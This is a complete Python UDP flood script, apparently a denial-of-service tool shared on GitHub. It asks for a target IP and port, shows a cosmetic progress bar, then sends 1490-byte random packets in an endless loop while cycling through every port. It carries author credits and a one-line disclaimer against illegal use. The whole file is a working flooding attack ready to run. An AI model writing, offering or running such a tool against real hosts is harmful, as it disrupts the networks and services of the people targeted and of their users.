import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("cls")
print("Author   : HA-MRX")
print("github   : https://github.com/Hackerwjh")
print("QQ       : 3417242411")
print("软件仅仅用于试验，切勿用于非法用途")
print
ip = input("IP Target : ")
port = input("Port       : ")
port = int(port)
os.system("cls")
for i in range(0,100):
    os.system("cls")
    print("["+str("="*int((20*(i+1))//100)).ljust(20," ")+"]"+str(i+1)+"%")
    time.sleep(0.2)
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    port = port + 1
    print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
    if port == 65534:
        port = 1
